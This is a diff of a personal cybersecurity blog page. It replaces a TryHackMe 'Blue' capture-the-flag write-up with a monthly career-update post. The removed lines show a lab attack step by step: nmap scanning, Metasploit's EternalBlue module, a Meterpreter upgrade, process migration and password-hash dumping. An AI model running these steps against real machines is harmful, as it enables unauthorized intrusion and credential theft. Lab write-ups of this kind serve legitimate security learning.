@@ -6,22 +6,17 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="TryHackMe CTF: Blue Room Writeup
-https://tryhackme.com/r/room/blue
-Room Information
-This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.
-Initial Scanning
-I started by running an Nmap scan on the target IP address:
-sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open ports:" />
-<meta name="keywords" content=", CTF, THM, TryHackMe, Metasploit, Meterpreter, SMB, nmap, EternalBlue, MS17_010" />
+<meta name="description" content="The Monthly Patch 2025.01 Welcome to The Monthly Patch, a new blog series where I document my cybersecurity journey, both personal and professional. My goal with this blog is twofold:
+To serve as a motivational tool—tracking my progress and pushing myself to continuously improve. To provide a transparent record of my learning journey—allowing potential employers and like-minded professionals to see my dedication to cybersecurity growth. Each month, I&amp;rsquo;ll cover my progress, learning experiences, projects, and future goals." />
+<meta name="keywords" content=", The Monthly Patch, 2025.01, Updates" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
-<link rel="canonical" href="http://localhost:1313/posts/2024/07/ctf-blue-thm/" />
+<link rel="canonical" href="http://localhost:1313/posts/2025/01/the-monthly-patch-2025.01/" />
 
 
     <title>
         
-            CTF Blue THM :: Nod&#39;s Notes  — Hack The Planet
+            The Monthly Patch 2025.01 :: Nod&#39;s Notes  — Hack The Planet
         
     </title>
 
@@ -43,54 +38,36 @@ sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open 
 
 
 
-  <meta itemprop="name" content="CTF Blue THM">
-  <meta itemprop="description" content="TryHackMe CTF: Blue Room Writeup
-https://tryhackme.com/r/room/blue
-Room Information
-This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.
-Initial Scanning
-I started by running an Nmap scan on the target IP address:
-sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open ports:">
-  <meta itemprop="datePublished" content="2024-07-22T18:42:43+10:00">
-  <meta itemprop="dateModified" content="2024-07-22T18:42:43+10:00">
-  <meta itemprop="wordCount" content="611">
+  <meta itemprop="name" content="The Monthly Patch 2025.01">
+  <meta itemprop="description" content="The Monthly Patch 2025.01 Welcome to The Monthly Patch, a new blog series where I document my cybersecurity journey, both personal and professional. My goal with this blog is twofold:
+To serve as a motivational tool—tracking my progress and pushing myself to continuously improve. To provide a transparent record of my learning journey—allowing potential employers and like-minded professionals to see my dedication to cybersecurity growth. Each month, I’ll cover my progress, learning experiences, projects, and future goals.">
+  <meta itemprop="datePublished" content="2025-01-30T16:51:40+11:00">
+  <meta itemprop="dateModified" content="2025-01-30T16:51:40+11:00">
+  <meta itemprop="wordCount" content="530">
   <meta itemprop="image" content="http://localhost:1313/">
-  <meta itemprop="keywords" content="CTF,THM,TryHackMe,Metasploit,Meterpreter,SMB,Nmap,EternalBlue,MS17_010">
+  <meta itemprop="keywords" content="The Monthly Patch,2025.01,Updates">
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/">
-  <meta name="twitter:title" content="CTF Blue THM">
-  <meta name="twitter:description" content="TryHackMe CTF: Blue Room Writeup
-https://tryhackme.com/r/room/blue
-Room Information
-This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.
-Initial Scanning
-I started by running an Nmap scan on the target IP address:
-sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open ports:">
+  <meta name="twitter:title" content="The Monthly Patch 2025.01">
+  <meta name="twitter:description" content="The Monthly Patch 2025.01 Welcome to The Monthly Patch, a new blog series where I document my cybersecurity journey, both personal and professional. My goal with this blog is twofold:
+To serve as a motivational tool—tracking my progress and pushing myself to continuously improve. To provide a transparent record of my learning journey—allowing potential employers and like-minded professionals to see my dedication to cybersecurity growth. Each month, I’ll cover my progress, learning experiences, projects, and future goals.">
 
 
 
-    <meta property="og:url" content="http://localhost:1313/posts/2024/07/ctf-blue-thm/">
+    <meta property="og:url" content="http://localhost:1313/posts/2025/01/the-monthly-patch-2025.01/">
   <meta property="og:site_name" content="Nod&#39;s Notes">
-  <meta property="og:title" content="CTF Blue THM">
-  <meta property="og:description" content="TryHackMe CTF: Blue Room Writeup
-https://tryhackme.com/r/room/blue
-Room Information
-This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.
-Initial Scanning
-I started by running an Nmap scan on the target IP address:
-sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open ports:">
+  <meta property="og:title" content="The Monthly Patch 2025.01">
+  <meta property="og:description" content="The Monthly Patch 2025.01 Welcome to The Monthly Patch, a new blog series where I document my cybersecurity journey, both personal and professional. My goal with this blog is twofold:
+To serve as a motivational tool—tracking my progress and pushing myself to continuously improve. To provide a transparent record of my learning journey—allowing potential employers and like-minded professionals to see my dedication to cybersecurity growth. Each month, I’ll cover my progress, learning experiences, projects, and future goals.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2024-07-22T18:42:43+10:00">
-    <meta property="article:modified_time" content="2024-07-22T18:42:43+10:00">
-    <meta property="article:tag" content="CTF">
-    <meta property="article:tag" content="THM">
-    <meta property="article:tag" content="TryHackMe">
-    <meta property="article:tag" content="Metasploit">
-    <meta property="article:tag" content="Meterpreter">
-    <meta property="article:tag" content="SMB">
+    <meta property="article:published_time" content="2025-01-30T16:51:40+11:00">
+    <meta property="article:modified_time" content="2025-01-30T16:51:40+11:00">
+    <meta property="article:tag" content="The Monthly Patch">
+    <meta property="article:tag" content="2025.01">
+    <meta property="article:tag" content="Updates">
     <meta property="og:image" content="http://localhost:1313/">
 
 
@@ -98,7 +75,7 @@ sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open 
 
 
 
-    <meta property="article:published_time" content="2024-07-22 18:42:43 &#43;1000 AEST" />
+    <meta property="article:published_time" content="2025-01-30 16:51:40 &#43;1100 AEDT" />
 
 
 
@@ -193,7 +170,7 @@ sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open 
 
     <article>
       <h1 class="post-title">
-        <a href="http://localhost:1313/posts/2024/07/ctf-blue-thm/">CTF Blue THM</a>
+        <a href="http://localhost:1313/posts/2025/01/the-monthly-patch-2025.01/">The Monthly Patch 2025.01</a>
       </h1>
 
       
@@ -203,89 +180,54 @@ sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open 
       
 
       <div class="post-content">
-        <p><strong>TryHackMe CTF: Blue Room Writeup</strong><br>
-<a href="https://tryhackme.com/r/room/blue">https://tryhackme.com/r/room/blue</a><br>
-<strong>Room Information</strong></p>
-<p>This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.</p>
-<p><strong>Initial Scanning</strong></p>
-<p>I started by running an Nmap scan on the target IP address:</p>
-<pre tabindex="0"><code>sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233
-</code></pre><p>The Nmap scan revealed several open ports:</p>
-<pre tabindex="0"><code>PORT      STATE SERVICE            VERSION
-135/tcp   open  msrpc              Microsoft Windows RPC
-139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
-3389/tcp  open  ssl/ms-wbt-server?
-49152/tcp open  msrpc              Microsoft Windows RPC
-49153/tcp open  msrpc              Microsoft Windows RPC
-49154/tcp open  msrpc              Microsoft Windows RPC
-49158/tcp open  msrpc              Microsoft Windows RPC
-49159/tcp open  msrpc              Microsoft Windows RPC
-</code></pre><p>After reviewing the results, I noticed three ports below 1000, which answered one of the CTF questions.</p>
-<p>Given the machine is running Windows 7 Professional with SMB service on port 445, I inferred it could be vulnerable to the MS17-010 (EternalBlue) exploit.</p>
-<p><strong>Exploitation with Metasploit</strong></p>
-<p>To exploit this vulnerability, I launched Metasploit and searched for the appropriate module.</p>
-<pre tabindex="0"><code>msfconsole
-search exploit/windows/smb/ms17_010_eternalblue
-</code></pre><p>The search returned the module I needed, so I proceeded to use it.</p>
-<pre tabindex="0"><code>use exploit/windows/smb/ms17_010_eternalblue
-</code></pre><p>Next, I configured the necessary options:</p>
-<pre tabindex="0"><code>show options
-set LHOST &lt;My_IP&gt;
-set RHOSTS 10.10.216.233
-</code></pre><p>I then ran the exploit.</p>
-<pre tabindex="0"><code>run
-</code></pre><p>The exploit was successful, and I gained a command shell on the target machine:</p>
-<pre tabindex="0"><code>[*] Command shell session 1 opened (My_IP:4444 -&gt; 10.10.216.233:49242)
-</code></pre><p><strong>Upgrading to Meterpreter</strong></p>
-<p>To enhance my capabilities on the target, I decided to upgrade the shell to a Meterpreter session. After some research, I found that Metasploit offers a module for this purpose.</p>
-<pre tabindex="0"><code>background
-search post/multi/manage/shell_to_meterpreter
-use post/multi/manage/shell_to_meterpreter
-</code></pre><p>I checked the required options and set them accordingly:</p>
-<pre tabindex="0"><code>show options
-set SESSION 1
-set LHOST &lt;Your_IP&gt;
-set LPORT 4433
-run
-</code></pre><p>I confirmed the Meterpreter session:</p>
-<pre tabindex="0"><code>sessions -l
-</code></pre><p><strong>Privilege Escalation and Flag Discovery</strong></p>
-<p>With the Meterpreter session active, I listed the running processes and selected a system-level process for migration to gain higher privileges.</p>
-<pre tabindex="0"><code>ps
-migrate &lt;PID&gt;
-</code></pre><p>Having escalated privileges, I proceeded to dump the password hashes:</p>
-<pre tabindex="0"><code>hashdump
-</code></pre><p>I used CrackStation to crack the hashes and retrieved the user credentials which was required as a question on the CTF.</p>
-<p>I was then asked to locate 3 flags on the system.</p>
-<p><strong>Flag 1</strong></p>
-<p>The CTF mentioned the first flag is located at the system root. I navigated to the C:\ drive and located first flag.</p>
-<pre tabindex="0"><code>meterpreter &gt; cd C:\
-meterpreter &gt; ls
-meterpreter &gt; cat flag1.txt
-flag{access_the_machine}
-</code></pre><p>Knowing that the first flag was named flag1.txt I assumed flag 2 and 3 would follow the same naming convention.</p>
-<p>I then decided to use the search function to find flags 2 and 3.</p>
-<p><strong>Flag 2</strong></p>
-<p>The second flag is located where Windows stores passwords. I utilised the search function to find it:</p>
-<pre tabindex="0"><code>meterpreter &gt; search -f flag2.txt
-Found 1 result...
-
-c:\Windows\System32\config\flag2.txt
-</code></pre><p>I navigated to the directory and viewed the contents:</p>
-<pre tabindex="0"><code>meterpreter &gt; cat c:\Windows\System32\config\flag2.txt
-flag{sam_database_elevated_access}
-</code></pre><p><strong>Flag 3</strong></p>
-<p>The third flag is located in the user’s documents. Again, I used the search function:</p>
-<pre tabindex="0"><code>meterpreter &gt; search -f flag3.txt
-Found 1 result...
-
-c:\Users\Jon\Documents\flag3.txt
-</code></pre><p>I navigated to the directory and viewed the contents:</p>
-<pre tabindex="0"><code>meterpreter &gt; cat c:\Users\Jon\Documents\flag3.txt
-flag{admin_documents_can_be_valuable}
-</code></pre><p><strong>Conclusion</strong></p>
-<p>This CTF was an excellent learning experience. Running through the Nmap scan helped me identify the open ports and potential vulnerabilities. Utilising Metasploit to exploit the MS17-010 vulnerability and upgrading to a Meterpreter session provided valuable practice in exploiting and navigating a Windows system. Retrieving the flags reinforced my skills in locating sensitive information within a compromised machine. I look forward to tackling more CTF challenges in the future.</p>
+        <h1 id="the-monthly-patch-202501"><strong>The Monthly Patch 2025.01</strong></h1>
+<p>Welcome to <strong>The Monthly Patch</strong>, a new blog series where I document my cybersecurity journey, both personal and professional. My goal with this blog is twofold:</p>
+<ol>
+<li>To serve as a <strong>motivational tool</strong>—tracking my progress and pushing myself to continuously improve.</li>
+<li>To provide a <strong>transparent record</strong> of my learning journey—allowing potential employers and like-minded professionals to see my dedication to cybersecurity growth.</li>
+</ol>
+<p>Each month, I&rsquo;ll cover my progress, learning experiences, projects, and future goals. Now, let&rsquo;s dive into <strong>January 2025</strong>!</p>
+<hr>
+<h2 id="-wrapping-up-2024-my-cybersecurity-milestone"><strong>📜 Wrapping Up 2024: My Cybersecurity Milestone</strong></h2>
+<p>December 2024 was a <strong>major milestone</strong> for me—I officially <strong>graduated with a Diploma of Cybersecurity with Distinction</strong>, achieving a <strong>GPA of 6.5</strong>. This was a huge accomplishment after a full year of intense study.</p>
+<p>To celebrate, I took the rest of December off to <strong>spend time with family, unwind, and recharge</strong> after a demanding academic year.</p>
+<hr>
+<h2 id="-january-the-job-hunt-begins"><strong>🚀 January: The Job Hunt Begins</strong></h2>
+<p>With the new year in full swing, I shifted my focus to landing a cybersecurity role. This month, I:</p>
+<ul>
+<li><strong>Refined my resume</strong> and <strong>updated my LinkedIn</strong> and other job-seeking profiles.</li>
+<li><strong>Applied for around 40 jobs</strong> in cybersecurity-related fields. While this isn’t a massive number, I wanted to <strong>prioritise quality over quantity</strong>—tailoring applications for roles that align with my interests and skillset.</li>
+<li>My goal for <strong>February</strong> is to <strong>increase applications</strong> while securing interviews and, ideally, receiving offers.</li>
+</ul>
+<hr>
+<h2 id="-getting-back-to-hands-on-learning"><strong>💻 Getting Back to Hands-On Learning</strong></h2>
+<p>Now that my formal studies are complete, I’m <strong>returning to TryHackMe</strong> to continue upskilling. Specifically, I aim to:</p>
+<p>✅ <strong>Complete the SOC Level 1 Learning Path</strong> before the end of February.</p>
+<p>I’ve also started the <strong>Google Cybersecurity Certificate on Coursera</strong>. Although it’s structured as a 3–6 month program (at 7 hours per week), I believe my existing knowledge will allow me to <strong>fast-track my progress and complete it in February</strong>.</p>
+<hr>
+<h2 id="-expanding-my-knowledge-base"><strong>📝 Expanding My Knowledge Base</strong></h2>
+<p>I’ve been maintaining cybersecurity notes in <strong>Obsidian</strong>, and I plan to:</p>
+<ul>
+<li>Continue <strong>expanding my notes</strong> with key concepts, attack techniques, and defensive strategies.</li>
+<li>Explore <strong>alternative platforms</strong> in case I find a more efficient solution for managing and organizing my cybersecurity knowledge.</li>
+</ul>
+<hr>
+<h2 id="-staying-up-to-date-with-industry-trends"><strong>🌍 Staying Up to Date with Industry Trends</strong></h2>
+<p>Keeping up with industry developments is crucial, so I’ve been:</p>
+<ul>
+<li><strong>Watching Simply Cyber&rsquo;s Daily Cyber Threat Brief</strong> with Gerald Auger to stay informed on real-world cybersecurity threats.</li>
+<li>Exploring <strong>SIEM lab projects</strong>, inspired by one of Gerald Auger’s videos on <strong>building a home SIEM setup</strong> to practice detecting, analyzing, and responding to security events.</li>
+</ul>
+<p>My plan for <strong>February</strong> is to <strong>set up a SIEM lab</strong> in my home lab environment, so I can better understand <strong>log analysis, alerts, and security monitoring</strong>.</p>
+<hr>
+<h2 id="-looking-ahead-february-2025-goals"><strong>🎯 Looking Ahead: February 2025 Goals</strong></h2>
+<p>🔥 <strong>Increase job applications and secure interviews.</strong><br>
+🔥 <strong>Complete the TryHackMe SOC Level 1 Learning Path.</strong><br>
+🔥 <strong>Finish the Google Cybersecurity Certificate on Coursera.</strong><br>
+🔥 <strong>Build a SIEM lab in my home environment.</strong><br>
+🔥 <strong>Continue expanding and refining my knowledge base.</strong></p>
+<p>Wrapping up, I feel a <strong>strong sense of accomplishment</strong> from graduating in December, but I know <strong>this is just the beginning</strong>. Cybersecurity is a field of continuous learning, and I’m excited for the next steps in my journey.</p>
+<p>Let’s make February a productive month! 💪</p>
 
       </div>
     </article>
@@ -297,15 +239,9 @@ flag{admin_documents_can_be_valuable}
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
 
-        <span class="tag"><a href="http://localhost:1313/tags/ctf/">CTF</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/thm/">THM</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/tryhackme/">TryHackMe</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/metasploit/">Metasploit</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/meterpreter/">Meterpreter</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/smb/">SMB</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/nmap/">nmap</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/eternalblue/">EternalBlue</a></span>
-        <span class="tag"><a href="http://localhost:1313/tags/ms17_010/">MS17_010</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/the-monthly-patch/">The Monthly Patch</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/2025.01/">2025.01</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/updates/">Updates</a></span>
         
     </p>
 
@@ -319,7 +255,7 @@ flag{admin_documents_can_be_valuable}
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        611 Words
+        530 Words
       </p>
 
       <p>
@@ -330,7 +266,7 @@ flag{admin_documents_can_be_valuable}
           <line x1="3" y1="10" x2="21" y2="10"></line>
         </svg>
         
-          2024-07-22 18:42
+          2025-01-30 16:51
         
 
          
@@ -341,7 +277,7 @@ flag{admin_documents_can_be_valuable}
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -349,7 +285,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
@@ -358,7 +294,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=CTF%20Blue%20THM&amp;caption=CTF%20Blue%20THM&amp;canonicalUrl=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=The%20Monthly%20Patch%202025.01&amp;caption=The%20Monthly%20Patch%202025.01&amp;canonicalUrl=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -367,7 +303,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=CTF%20Blue%20THM&amp;body=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=The%20Monthly%20Patch%202025.01&amp;body=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -375,7 +311,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f&amp;media=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f;description=CTF%20Blue%20THM" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f&amp;media=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f;description=The%20Monthly%20Patch%202025.01" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -383,7 +319,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f&amp;title=CTF%20Blue%20THM&amp;summary=CTF%20Blue%20THM&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f&amp;title=The%20Monthly%20Patch%202025.01&amp;summary=The%20Monthly%20Patch%202025.01&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -391,7 +327,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f&amp;resubmit=true&amp;title=CTF%20Blue%20THM" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f&amp;resubmit=true&amp;title=The%20Monthly%20Patch%202025.01" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -399,7 +335,7 @@ flag{admin_documents_can_be_valuable}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2024%2f07%2fctf-blue-thm%2f;title=CTF%20Blue%20THM" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2025%2f01%2fthe-monthly-patch-2025.01%2f;title=The%20Monthly%20Patch%202025.01" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
